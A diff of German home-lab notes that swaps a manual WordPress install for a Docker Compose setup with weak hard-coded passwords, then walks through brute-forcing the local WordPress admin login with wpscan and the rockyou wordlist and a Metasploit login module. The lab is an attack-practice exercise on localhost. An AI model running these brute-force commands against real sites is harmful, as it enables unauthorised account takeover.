@@ -16,98 +16,113 @@ In den Labornotizen findet man zum Schluss eine Schritt für Schritt Anleitung d
 
 
 ---
-## 1. Anforderungen
 
-1. Kali linux und Ubuntu VM erstellen
-2. Beide sollen ein NAT interface haben und über DHCP ihre IP beziehen
+## 1. Kali Linux Konfiguration:
 
-## 2. Ubuntu Server Konfiguration:
-
-Linux Ubuntu aufsetzen und diese Anleitung befolgen:
-- https://dev.to/teetoflame/virtual-machine-setup-and-wordpress-installation-documentation-28m7 
-
-### 2.1. Web server installieren: 
+### 1.1 Docker installieren/aufsetzen: 
 
 Prerequisites installieren: 
 ```
-sudo apt update && sudo apt upgrade -y
-sudo apt install apache2 mysql-server php php-mysql libapache2-mod-php unzip wget -y
+sudo apt update
+sudo apt install -y docker.io
+sudo apt install docker-compose
+sudo systemctl enable docker --now
+mkdir ~/wp-docker 
 ```
 
-Secure MySQL Installation starten und den Installationsprozess folgen: 
+Nachdem man Docker installiert hat muss man nun die **compose-docker.yml** anlegen und mit Inhalt zur Installation von Wordpress und MYSQL.
+
+**compose-docker.yml:**
+```
+services:
+  db:
+    # MariaDB image supporting amd64 & arm64
+    image: mariadb:10.6.4-focal
+    command: '--default-authentication-plugin=mysql_native_password'
+    volumes:
+      - db_data:/var/lib/mysql
+    restart: always
+    environment:
+      MYSQL_ROOT_PASSWORD: cisco123
+      MYSQL_DATABASE: wordpress
+      MYSQL_USER: wp_user
+      MYSQL_PASSWORD: cisco123
+    expose:
+      - "3306"
+      - "33060"
+
+  wordpress:
+    image: wordpress:latest
+    depends_on:
+      - db
+    ports:
+      - "8080:80"       
+    restart: always
+    environment:
+      WORDPRESS_DB_HOST: db:3306
+      WORDPRESS_DB_USER: wp_user
+      WORDPRESS_DB_PASSWORD: cisco123
+      WORDPRESS_DB_NAME: wordpress
+    volumes:
+      - wp_data:/var/www/html
+
+volumes:
+  db_data:
+  wp_data:
 
 ```
-sudo mysql_secure_installation
-```
 
-WordPress Datenbank anlegen: 
+Nach dem Anlegen der Datei muss man in das Verzeichnis navigieren und von dort aus dem command: 
 
 ```
-sudo mysql -u root -p
+cd ~/wp-docker/
+sudo docker compose up -d
 ```
-Hier jetzt im SQL Prompt eine Datenbank, User anlegen und Privileges verteilen. 
+Wenn der Command ausgeführt wurde dauert es ein wenig bis der Server verfügbar ist. 
 
-```
-CREATE DATABASE wordpress;
-CREATE USER 'wordpressuser'@'localhost' IDENTIFIED BY 'Ganzgeheim123!';
-GRANT ALL PRIVILEGES ON wordpress.* TO 'wordpressuser'@'localhost';
-FLUSH PRIVILEGES;
-EXIT;
-```
+![image](./IMAGES/Docker_wp_db_start.png)
 
-Jetzt WordPress installieren
+### 1.2 Wordpress einstellen
 
-``` 
-wget https://wordpress.org/latest.tar.gz
-tar -xvzf latest.tar.gz
-sudo mv wordpress /var/www/html/
-```
+Nachdem das Aufsetzen von Docker erledigt ist und der Prozess von Wordpress am laufen ist. (kann mit `sudo docker ps` nachgeschaut werden)
+![image](./IMAGES/Docker_Prozesse.png)
 
-Permission an Wordpress verteilen: 
-```
-sudo chown -R www-data:www-data /var/www/html/wordpress
-sudo chmod -R 755 /var/www/html/wordpress
-```
-
-### 2.2 Apache Server anpassen für WordPress: 
-
-Konfiguration von Apache anpassen damit die Startseite von Wordpress genommen wird und nicht die default von apache
-
-```
-sudo nano /etc/apache2/sites-available/000-default.conf
-```
-
-Jetzt in dem File DocumentRoot verändern: 
-
-```
-DocumentRoot /var/www/html/wordpress
-```
-
-Nun die Default Apache Site deaktivieren und rewrite modul aktivieren und apache neustarten, damit die Änderungen effekt nehmen: 
-
-```
-sudo a2dissite 000-default.conf
-sudo a2enmod rewrite
-sudo systemctl restart apache2
-```
-
-Jetzt wenn man im Browser die IP des Servers eingibt sollte man auf die Installations Fenster von Wordpress kommen.
-
-### 2.3 WordPress Erstinstallation
-
-Den Installations Dialog einfach folgen. 
+Wenn der Prozess am laufen ist kann man nun im Webbrowser, unter http://localhost:8080 den Wordpress Server erreichen. Beim erstmaligen Öffnen der Seite muss man die grundlegende Konfiguration der Seite machen. Ich habe als user *wp_user* und als passwort *cisco123* angegeben.
 
 ![images](./IMAGES/Wordpress_Install_1.png)
 
-Danach kommt man dann zu einem anderen Fenster dort dann auch einfach installation durchlaufen. 
+Nachdem der Dialog abgeschlossen ist, ist die Website fertig zum verwenden/angreifen. 
 
-## 3. Kali Linux 
 
-### 3.1 WPscan 
+## 2. Angriff mit Kali
+
+### 2.1 WPscan 
 - https://www.hackingarticles.in/multiple-ways-to-crack-wordpress-login/
 
 WPscan is a command-line tool which is used as a black box vulnerability scanner. It is commonly used by security professionals and bloggers to test the security of their website. WPscan comes pre-installed on the most security-based Linux distributions and it is also available as a plug-in.
 
-wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
+```
+gunzip /usr/share/wordlists/rockyou.txt.gz 
+wpscan --url http://127.0.0.1:8080 -P /usr/share/wordlists/rockyou.txt
+```
 
+Nachdem der **wpscan** command ausgeführt wurde, fangt der Angriff an. Als Erstes wird nach der Version von Wordpress gesucht, danach nach dem Adminkonto und dann mithilfe des rockyou files eine Bruteforce Attacke durchgeführt. (Ich habe die rockyou.txt verändert, da cisco123 erst in Zeile 140000 erscheint, habe ich es auf Stelle 350 veschoben)
 
+![image](./IMAGES/wpscan_time.png)
+
+Jetzt haben wir das Credentials für den Adminaccount: **wp_user:cisco123**
+
+### 2.2 Mit msf Wordpress exploiten
+
+Da wir jetzt den Scan/Bruteforce attacke auf den Server ausgeführt haben, haben wir ja die Credentials des Kontos bekommen. Jetzt kann man mit metasploit einen exploit starten: 
+
+```
+use auxiliary/scanner/http/wordpress_login_enum
+set rhosts 127.0.0.1
+set rport 8080
+set username wp_user
+set password cisco123
+exploit
+```
+
+![image](./IMAGES/wp_msf_1.png)
